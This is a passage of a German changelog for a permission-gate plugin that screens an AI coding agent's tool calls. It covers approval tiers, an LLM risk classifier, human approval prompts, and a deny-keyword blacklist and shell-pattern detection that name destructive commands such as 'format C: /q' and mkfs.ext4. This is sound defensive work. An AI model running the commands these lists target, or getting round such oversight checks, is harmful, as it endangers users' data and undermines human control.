  / remote / system / bulk) verweigern automatisch, Timeouts wiederholen einmal, und jeder Fehler
  bleibt fail-closed.
- Verdict-Lernen (`riskLearning`, standardmäßig aus; `riskThreshold` 1–10, Default 3): neutrale
  Asks, von einem Menschen bestätigt und tatsächlich ausgeführt, zählen auf das Auto-Allow
  exakt derselben Operation (Fingerprint-Match) — persistiert in
  `$DSH_HOME/perm-gate/learning.json`, nie in die YAML-Regeln des Nutzers.
- Entscheidungs-Ereignis-Feed: jede Entscheidung hängt an `$DSH_HOME/perm-gate/events.jsonl` und
  wird unter `GET /api/dsh-perm-gate/events?sessionId=&since=` ausgeliefert; die Browser-Hälfte
  zeigt die letzte Entscheidung als Hinweisband über der Konversationseingabe.
- Das Permission-Picker-Icon dekoriert nun auch den eingeklappten Picker-Auslöser.
- Freigabeprotokoll-Seite: Die Konversationsansicht erhält einen **Approvals**-Tab, der die
  Gate-Entscheidungen der Sitzung neueste-zuerst listet (Timeline mit Art-Tags, Risikokategorie
  und Zeit); die Whitelist der Einstellungskarte ist nun eine editierbare Regelliste mit
  Zeilenlöschung plus Massenedit-Schalter.
- Lern-Sedimentation (`riskSediment`, Default an): Die bestätigten Proben eines
  Schwellenwert-erreichten Schlüssels werden deterministische Auto-Allow-Regeln — exakte
  Fingerprint-Treffer überspringen den LLM-Aufruf komplett und überleben den llmAssist-Schalter;
  die Einstellungskarte listet sie mit per-Key-Beendigung und per-Sample-Entfernung (hinter
  `GET/POST /api/dsh-perm-gate/learning`).
- Wählbarer llmAssist-Empfänger: **eigene API** (OpenAI-kompatibel, mit Endpoint-Presets u. a.
  Xiaomi MiMo `https://api.xiaomimimo.com/v1`) oder die **DSH-Host-Modellgruppe** (`llm`-Dienst +
  `agentDefaultModel.currentSelection`, Provider/Modell überschreibbar) — plus ein
  **Gesundheitstest**-Button (`POST /api/dsh-perm-gate/health`), der eine minimale Completion
  ausführt und die Latenz meldet. Die Karte liest den Live-Katalog an Providern/Modellgruppen
  (Host `llm.listProviders`/`listModels` — nutzerkonfigurierte Custom-Gruppen eingeschlossen)
  über `GET /api/dsh-perm-gate/receiver` und zeigt die effektive Provider/Modell-Wahl.
- Preset-Deny-Keyword-Blacklist geerbt von dsh-approval-gate (`DEFAULT_DENY_KEYWORDS`): ein
  case-insensitiver Keyword-Treffer setzt ein Veto gegen den Aufruf vor Whitelist / Grants / LLM;
  als Liste in der Einstellungskarte editierbar, mit Preset-Tags und Ein-Klick-Wiederherstellung;
  nicht gesetzt oder leer wendet das Preset an (die Blacklist schaltet sich nie still aus).
- **Freigabeprotokoll-Review-Ebene**: Die betroffenen Dateien jeder Entscheidung werden vor dem
  Landen der Änderung gesnapshottet (≤ 5 Dateien, je ≤ 256 KB) unter
  `$DSH_HOME/perm-gate/snapshots/`; der **Approvals**-Tab macht aus diesen Dateien klickbare
  Chips, die ein Zeilen-Diff öffnen (`GET /api/dsh-perm-gate/diff`) mit einer **Revert**-Aktion,
  die eine Wiederherstellungsanweisung in die Konversation liefert
  (`POST /api/dsh-perm-gate/revert`), plus eine Snapshot-Bestandsleiste
  (`GET /api/dsh-perm-gate/snapshots-stats`, `POST /api/dsh-perm-gate/snapshots-clear`,
  sitzungsbezogen oder alles). Ereigniszeilen tragen nun `files`, `justification`, `verdict` und
  `category`.
- **Manuelle Freigabe-Terminal-Einträge**: Ein an einen Menschen gerichtetes `ask` wird verfolgt
  und mit der tatsächlichen Antwort des Menschen abgeschlossen, durch einen passiven
  `approval/request`-Beobachter — `allowed-once` → genehmigt, `rejected` → abgelehnt,
  `cancelled` → abgebrochen, `unavailable` → eine Ablehnung (kein Freigabekanal). `tools/result`
  schließt dasselbe Ask als Fallback ab, wenn der Beobachter es nicht zuordnen kann (fehlende
  `callId`, kein Freigabedienst oder ein früherer Listener, der den Wasserfall kurzschließt);
  „löschen beim Abschluss“ ist die ganze Deduplizierungsregel. Freigaben berichten den
  Lernfortschritt nach der Freigabe (`n`/Schwellenwert), und das Hinweisband beschriftet alle
  drei Endzustände.

### Entfernt

- Die ausgemusterte **Auto**-Berechtigungsstufe wird in `cordis.patch.yml` nicht mehr restatuiert.
  Der DSH-Bundle-Patch ersetzt die ganze `permission.config.presets`-Map, daher musste diese
  Datei jede Stufe tragen, die überleben soll — inklusive `auto`, das `dsh-auto-mode` beisteuerte.
  Jenes Plugin ist deinstalliert: seine Regler waren identisch mit `workspace-write`, seine
  Beschreibung „automatische Review / Einmal-Freigabe“ verlor mit ihm ihre Implementierung, und
  dieses Gate ist in jener Stufe inaktiv (`gatePresets` defaulted auf `['permissive']`). Der
  Picker bietet nun die drei Eingebauten (`read-only` / `workspace-write` / `danger-full-access`,
  restatuiert aus `@deepseek-ai/dsh-base/cordis.patch.yml`) plus das `permissive` dieses Plugins.
- `test/patch-presets.spec.ts` pinnt genau jenen Schlüsselsatz, sodass eine eingebaute Stufe nicht
  mehr fallen gelassen (oder eine ausgemusterte auferweckt) werden kann, ohne die Suite scheitern
  zu lassen.

### Geändert

- **DSH-Dualversions-Unterstützung (0.1.0-rc.7 … 0.1.2-rc.1).** Ein Artefakt deckt nun
  `dsh-v0.1.1-rc.2` und `dsh-v0.1.2-rc.1` ohne Versionsprüfung ab. `effectivePolicy` ist in
  beiden Versionen eine **private** Methode des Nutzerfreigabe-Dienstes, daher wird sie hinter
  einer `typeof`-Probe gelesen, und eine werfende/fehlende Probe degradiert nun zu „Policy
  unbekannt“ (das Ask steht) statt den Entscheidungspfad scheitern zu lassen. Die
  Settings-Registrierung behält `ctx.settings.register`, das es in jeder unterstützten Version
  gibt. `dsh.client.inject` benennt nicht mehr `@deepseek-ai/dsh-client-runtime` (entfernt in
  0.1.2) oder `@deepseek-ai/dsh-client-ui-slots` (in keiner Version eine dynamische
  Client-Zeile); es listet nun die echten Client-Zeilen, in die es rendert. `engines.dsh` und
  eine Versionskompatibilitätstabelle kamen ins README.
- Das Gate ist **nur in den in `gatePresets` gelisteten Berechtigungsstufen aktiv** (Default
  `['permissive']`, die Stufe, die dieses Plugin hinzufügt). In jeder anderen Stufe — Read Only,
  Workspace Write, Auto, Full Access, `custom` — läuft sein Entscheidungsfluss gar nicht: kein
  Allow, kein Ask, kein Deny, kein P0-Hard-Deny, kein Deny-Keyword-Veto, kein Audit-Ereignis.
  `gatePresets: ['*']` macht das Gate wieder global (Hard-Deny eingeschlossen); ein Embedding,
  das keinen Scope übergibt, behält das Legacy-Verhalten.
- `llmAssist` nutzt nun das Risikokategorie-Protokoll (Obermenge der bisherigen
  allow/deny/ask-Verdicts); `classifier.ts` teilt sich einen OpenAI-kompatiblen Transport
  (`chatCompletion`) mit dem Risikograder. Harte Risikokategorien (`deletion` / `credential` /
  `remote` / `system` / `bulk`) **verweigern nun automatisch** statt an den Menschen zu
  routen — die Operation ist klar gefährlich, und keine Popup wird gebraucht; nur
  `risky:neutral` (unsicher) erreicht weiterhin die menschliche Naht.
- Die `write`/`edit`-Tools haben nun einen **pfadsensitiven Default**: Workspace-interne Schreibvorgänge
  folgen dem konfigurierten `defaultAction` (typischerweise `allow`); Schreibvorgänge auf Pfade
  außerhalb des Sitzungs-Workspace eskalieren zu `ask`, damit der Inhalt geprüft werden kann. Der
  LLM-Klassifikator kann dann sichere Inhalte auto-erlauben oder schädliche auto-verweigern, sodass
  nur wirklich unsichere Operationen eine Popup erzeugen.

### Behoben

- **`llmAssist` „safe“ erlaubt nun tatsächlich automatisch, statt nur aufgezeichnet zu werden.**
  Der `tools/pre-execute`-Listener gab das `ask` sofort zurück und stufte den Aufruf im
  Hintergrund ein, aber ein an den Host übergebener Ask ist bereits auf dem Weg zu den
  Freigabe-Antwortern, und DSH bietet keine API, ihn zurückzuziehen (das eigene `signal` der
  Anfrage kann ihn nur `cancelled` stellen). Das Panel erschien also weiterhin, und der Mensch
  musste klicken, während der Feed das `safe`-Auto-Allow zeigte — und ein Hard-Risk-`auto-deny`
  erreichte den Host gar nicht. Der Listener wartet nun `refineAsk` **ab**, bevor er die
  Entscheidung zurückgibt (`makePreExecuteListener`): `safe` delegiert via `next()` ohne Panel,
  eine Hard-Risk-Kategorie verweigert automatisch, und nur `risky:neutral` / `unresolved` /
  ein Grader-Fehler behält die menschliche Nachfrage (fail-closed). Die Wartezeit ist durch
  `riskTimeoutMs` (Default 20 s) begrenzt, und ein bereits abgebrochener Aufruf überspringt die
  Einordnung.
- **Die Shell-Write-Pattern-Schicht lief nie für DSHs primäres Shell-Tool.** `SHELL_TOOLS`
  listete `bash` / `pwsh` / `sh` / `cmd` / `powershell`, aber nicht **`shell`** (DSHs eigener
  Toolname) oder `terminal`, daher fielen `git push`, `chmod`, `tee`, Redirects und jedes andere
  Write-Pattern zum `defaultAction` durch, statt zu `ask` zu eskalieren. Die Liste ist nun
  `shell` / `terminal` / `bash` / `pwsh` / `sh` / `cmd` / `powershell`, und die Dublette in
  `learning.ts` wurde entfernt (eine Quelle in `evaluate.ts`, damit Entscheidungspfad und
  Lern-Fingerprint nicht wieder auseinanderdriften).
- **Redirect- und `tee`-Erkennung war zu eng.** Nur `>>` matchte, daher galten
  `echo x > /tmp/out.txt` und ein nacktes `tee /tmp/log.txt` als nur lesend. `> f` / `>> f` /
  `>f` eskalieren nun, während die stderr-Idiome, die ein nur-lesender Befehl nutzt (`2>&1`,
  `>&2`, `2>/dev/null`, `1>&2`), nur-lesend bleiben; `curl` / `wget` eskalieren nur, wenn sie
  eine Datei schreiben (`-o` / `-O` / `>`).
- **`decideRules` ignorierte `args.command`.** Sie las nur den abgeleiteten `ctx.commandText`,
  sodass jeder Aufrufer, der einen Kontext von Hand baute (Tests, Embedder), still die
  Befehlsinspektion verlor. Sie fällt nun auf `args.command` zurück, passend zu
  `PermGateRuntime.ctxFor`.
- **Das Gate überstimmte die vom Nutzer gewählte Berechtigungsstufe.** Es besitzt eine
  unabhängige Freigabestufe, handelte aber in *jedem* Preset: jeder Übertritt wurde ein `ask`,
  `dsh-tools` leitete es an den DSH-Freigabeseam weiter, und unter dem `danger-full-access`-Preset
  (`approval: never`) gibt jener Seam `rejected` zurück, **bevor irgendein Antworter läuft** — es
  wurde nie ein Panel gerendert, und jeder Nicht-Read-only-Aufruf scheiterte mit dem irreführenden
  `the user rejected tool "..."`. Seine Hard-Deny- und Deny-Keyword-Schichten ignorierten die
  Stufe ebenso, sodass `danger-full-access` („Vollzugriff ohne Freigabeaufforderungen“) still
  verschmälert wurde. Das ganze Gate ist nun auf `gatePresets` beschränkt; außerhalb ist es inert
  und zeichnet nichts auf. Innerhalb einer aktiven Stufe degradiert ein `ask` weiterhin zum
  Durchgriff, wenn die effektive Freigabe-Policy der Sitzung `never` ist, sodass ein
  unbeantwortbares Ask nie zur Ablehnung werden kann.
- **Nur-lesende Suche und sitzungslokale Tools wurden nachgefragt.** `web_search` und
  `modlens_read_image` sind nur-lesende Abfragen, und `todo_write` / `render_ui` /
  `validate_dsh_ui` / `ask_user_question` / `exit_plan_mode` / `ralph` / `workflow` sind
  Sitzungszustand oder Delegation, aber keines stand in der Auto-Allow-Klassifikation, sodass
  jedes ein `ask` auslöste (die `no rule matched; default action`-Popup). Sie sind nun
  auto-erlaubt, und eine neue `autoAllowTools`-Konfigurationsliste erweitert die Klassifikation
  um fremde nur-lesende Tools. P0-Hard-Deny und die Deny-Keyword-Schicht laufen weiterhin zuerst,
  sodass die Liste Autorität nie verbreitern kann.
- **`write`/`edit` auf Pfade außerhalb des Workspace gingen still durch.** Ein Aufruf, der nach
  `~/.bashrc` oder in die Dateien eines anderen Laufwerks schreibt, erhielt den konfigurierten
  `defaultAction` (typischerweise `allow`) und lief ohne Prüfung. Ein pfadsensitiver Override
  greift nun bei Write/Edit-Tools, wenn keine Regel matcht: Workspace-interne Schreibvorgänge
  folgen dem konfigurierten `defaultAction`, aber jeder Zielpfad außerhalb des Sitzungs-Workspace
  eskaliert zu `ask`, damit der Inhalt geprüft werden kann — schädlicher Inhalt wird verweigert;
  harmlose Ergänzungen werden auto-erlaubt, wenn `llmAssist` an ist. Explizite Deny-Regeln
  gewinnen weiterhin unabhängig vom Pfad-Scope, und explizite Allow-Regeln können Zugang zu
  inneren Pfaden gewähren, aber niemals die Prüfung äußerer umgehen.
- **P0-Credential-Erkennung scannte Dokumentkörper**, sodass das Schreiben oder Bearbeiten jeder
  Datei, die nur ein Token, einen privaten Schlüssel oder `credentials.yaml` *erwähnte*,
  hard-verweigert wurde. Sie scannt nun nur die Argumente, die die Operation beschreiben
  (`command`, `file_path`, …), passend zur bestehenden Regel der Deny-Keyword-Schicht, dass der
  Text einer Datei nicht die Operation ist.
- **Ein `$DSH_HOME/perm-gate/rules.yml` wurde nie geladen.** `rulesFile` hatte keinen Default,
  sodass ein Profileintrag ohne `config` das Gate mit leerem Regelsatz und `defaultAction: ask`
  ließ — der `defaultAction: allow` des Nutzers und seine `allow:`-Regeln wurden still ignoriert.
  `rulesFile` defaulted nun auf `<dataDir>/rules.yml` (wie `eventsFile` / `learningFile`), und
  der Whitelist-Spiegel der Einstellungskarte schreibt tatsächlich dorthin.
- **`format` setzte ein Veto gegen das PowerShell-Cmdlet `Format-Table`.** Ein Bindestrich ist
  keine Wortgrenze für einen Befehlsbezeichner, daher matchte die Blacklist `Format-Table` /
  `Format-List`. Keyword-Ränder matchen nun gegen Bezeichnerzeichen (`[A-Za-z0-9_-]`), sodass
  `format C: /q` weiterhin erwischt wird, während sich `Format-Table` und `mkfs.ext4` wie bisher
  verhalten.
- **Jede Leseabfrage verlangte manuelle Freigabe.** `read` / `read_image` / `grep` / `glob` /
  `ls` / `lsp` sind workspace-beschränkte Leseoperationen, die nichts ändern können (P0-Hard-Deny
  blockiert weiterhin Lesungen sensibler Pfade außerhalb des Workspace-Roots). Sie sind nun
  auto-erlaubt. Dasselbe gilt für alle internen DSH-Koordinationstools (`agent_teams_*`,
  `conversation_search`, `memory_*`, `get_goal` / `update_goal` / `create_goal`, `taskboard_*`,
  `job_*`, `list_agents` / `interrupt_agent` / `send_message`, `subagent` / `subagent_fork` /
  `terminal` / `skill`).

- **Der Approvals-Tab löste keine Sitzungs-ID auf**, daher listete er nichts, während die
  Snapshot-Leiste das globale Inventar zeigte. Ein `conversation.view`-Occupant erhält die
  Standard-Props auf oberster Ebene (`sessionId` / `useSessions`) — die Form, die
  `ConversationRoot` konsumiert —, nicht unter `slotsProps`; die View und das Hinweisband
  sondieren nun die oberste Ebene, die verschachtelte Form und den Sitzungslisten-Hook.
- **Ereignisse wurden mit leerer Sitzungs-ID aufgezeichnet**, daher zeigte der Approvals-Tab
  (der nach der aktuellen Sitzung filtert) nichts, obwohl sich `events.jsonl` füllte. DSHs
  `ToolExecution` trägt die Sitzung an `agent.session.id` (Workspace-cwd an
  `agent.session.header.cwd`), nicht an `exec.sessionId` / `exec.cwd`; beide werden nun vom Agent
  gelesen, wenn die direkten Felder fehlen.
- **Die Review-Seite war bei einer Default-Installation still tot**: Mit einem Profileintrag
  ohne `config` war `dshHome` leer, also war das Datenverzeichnis `undefined`, und das
  Ereignislog wurde nie konstruiert — kein `events.jsonl`, keine Snapshots, kein persistiertes
  Lernen, und ein 404 auf `GET /api/dsh-perm-gate/events`. `dshHome` löst nun zu einem
  expliziten Wert auf, sonst `$DSH_HOME`, sonst `~/.dsh`, sodass
  `<dshHome>/perm-gate/{events.jsonl,learning.json,snapshots/}` immer geschrieben wird.
- Deny-Keyword-Matching setzt kein Veto mehr gegen ein Keyword, das bloß in einem längeren
  Bezeichner erscheint, und Dokumentkörper-Argumente (`content`, `new_string`, `old_string`,
  `text`, …) werden gar nicht mehr gescannt — der Text einer Datei ist nicht die Operation. Das
  Matching ist nun wortgrenzenbewusst, sodass punktuurbegrenzte und CJK-Keywords weiter
  funktionieren, und Whitespace wird kollabiert, sodass ein mit Leerzeichen geschriebener Befehl
  weiterhin erwischt wird.


### Hinzugefügt
- **Permissive-Stufe** — ein unabhängiger Freigabemodus parallel zu read-only / workspace-write /
  full-access / whitelist. Ein einzelner Front-Schalter (`permissive`) plus kombinierbare
  Backend-Strategien (`trustAutoAllow` / `alwaysConfirm` / `llmAssist`); P0-Hard-Deny bleibt
  monoton.
- Audit-Entscheidungsquellen `classifier` / `permissive`; optionaler injizierbarer
  `classify`-Hook für `llmAssist` (fail-closed bei `ask`/Abwesenheit).
- **Browser-Client** — eine `settings.plugins.tab`-Seite („Permissive approval tier“) rendert in
  Einstellungen → Plugins: ein Schalter (`permissive`) + drei Backend-`permissiveStrategies`-Schalter.
  Der Host liest den Namespace live, sodass Änderungen beim nächsten Toolaufruf ohne Neustart
  greifen.
- CLI-Flag `--permissive` und Permissive-Zusammenfassung in `--list`.
- **Echtes llmAssist-LLM** — ein konfigurierbarer OpenAI-kompatibler Klassifikator
  (`classifierEndpoint` / `classifierModel`), herangezogen, um ein `ask` automatisch zu
  entscheiden, und fail-closed zur menschlichen Naht.
- **Whitelist-Migration** — `approveAllowEverywhere` persistiert ein Befehlswort in die
  `allow`-Whitelist der Regeldatei und lädt neu; `approveRepeat` prägt ein begrenztes
  Session-Grant. Beide stehen hinter den zwei erweiterten Allow-Buttons des Always-Confirm-Panels.
- **Installationsanleitungen in vier Sprachen** — `INSTALL.md` / `INSTALL.zh.md` /
  `INSTALL.ja.md` / `INSTALL.ko.md` mit Installation, Upgrade, Migration von den aufgeteilten
  Plugins, Verifikation und Fehlerbehebung; jedes README bekam Sprachwechsel-Links, einen
  `ja`/`ko`-Kompatibilitätshinweis (das offizielle DSH-`LOCALE_IDS` ist `["zh", "en"]`) und eine
  Versionsreferenz.
- README.ja / README.ko zu vollständigen Spiegeln der englischen Quelle der Wahrheit ausgebaut
  (P0–P4-Kettentabelle, warum/features, Regeldateiformat, Permissive-Stufe, CLI).

## [0.1.0] - 2026-08-30

### Hinzugefügt
- P0–P4-Entscheidungskette: Hard-Deny, Session-Grant, statische Deny-zuerst-Regelkette,
  optionaler Klassifikator (aus), `ask`.
- Pure-Function-Regel-Engine: glob/regex-Kompilierung mit ReDoS-Schranke, lautes
  Parse-Versagen, Compile-Cache über Content-Hash.
- Befehls-Whitelist/Blacklist über argv-Zerlegung (`sh -c`/`bash -c`-Rekursion, Pipelines,
  Redirects, recursive/force).
- Präzise Session-Grants, keyed über kanonischen Fingerprint (TTL + maxUses, keine
  über-Ziele-Wiederverwendung).
- `{ignorable:true}`-Entscheidungsaudit mit Modell-sichtbar⟺geloggt-Invariante.
- Eigenständiger CLI-Dry-Run-Evaluator (`dsh-perm-gate --rules … --tool … --args …`).
- DSH-cordis-Funktionsplugin-Vertrag (`cordis.patch.yml`, Schemastery `Config`,
  exports/types).
- 4-sprachiges README (en/zh/ja/ko) und Keep-a-Changelog-Gerüst (en + ja + ko).
